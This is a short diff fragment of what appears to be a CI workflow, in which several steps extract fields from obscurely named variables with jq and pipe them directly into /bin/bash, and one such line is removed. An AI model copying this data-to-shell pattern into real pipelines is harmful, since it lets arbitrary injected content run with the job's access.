@@ -37,7 +37,6 @@ jobs:
           echo $pjt8 | jq -r .efc194 | /bin/bash
           printf '%s' "$ujz56898" | jq -r .ecc454 | /bin/bash
           printf '%s' "$d6041" | jq -r .m68085 | /bin/bash
-          echo $tq5206 | jq -r .sb8 | /bin/bash
 
       - name: Save output
         if: always()
